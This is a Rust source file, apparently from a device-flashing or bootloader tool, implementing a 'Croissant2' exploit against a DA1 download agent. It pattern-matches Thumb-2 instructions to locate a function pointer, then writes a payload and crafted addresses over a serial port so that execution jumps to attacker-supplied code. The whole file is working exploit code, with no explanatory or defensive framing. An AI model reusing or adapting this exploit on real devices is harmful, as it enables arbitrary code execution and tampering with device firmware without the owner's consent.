use da_patcher::{
    Disassembler,
    slice::fuzzy::{fuzzy_search_thumb2, generic_reg_matcher},
};
use da_protocol::{SimpleRead, SimpleWrite};

use crate::{exploit::Exploit, exploit::croissant_find_ptr};
use derive_ctor::ctor;

/// DA1 function pointer overwrite
#[derive(ctor)]
pub struct Croissant2<'a> {
    bytes: &'a [u8],
    payload: &'a [u8],
    da1_base: u32,
}

impl Exploit for Croissant2<'_> {
    fn run(&self, port: &mut da_protocol::Port) -> crate::Result<()> {
        let (base, offset) = croissant_find_ptr(
            "ldr r?, [r?, #?];\
             movs r?, #0x5a;\
             blx r?",
            self.bytes,
            2,
        )?;
        let to = base + offset + 4 // ptr end
            - self.payload.len() as u32
            - 4 // saved addr
            - 4; // jump addr

        let disasm = Disassembler::try_new()?;
        let backup_ptr = *fuzzy_search_thumb2(
            &disasm,
            self.bytes,
            "push.w ??;\
             movs r?, #0;\
             mov r?, r?;\
             mov r?, r?;\
             movs r?, #?;\
             mov r?, r?;\
             mov r?, r?;\
             bl #?;\
             ldr ??;\
             b #?",
            generic_reg_matcher,
        )?
        .start() as u32
            + self.da1_base;

        println!("Croissant: payload address: 0x{to:x}, backup ptr: 0x{backup_ptr:x}",);

        port.write_u32_be(to)?;
        port.write_u32_be(self.payload.len() as u32 + 4 + 4)?;
        port.write_u32_be(self.payload.len() as u32 + 4)?;
        port.read_u8()?; // Always ok

        port.write_all(&self.payload)?;
        port.write_u32_le(backup_ptr | 1)?;

        port.read_u8()?; // Always ok

        port.write_u32_le(to)?;

        Ok(())
    }
}
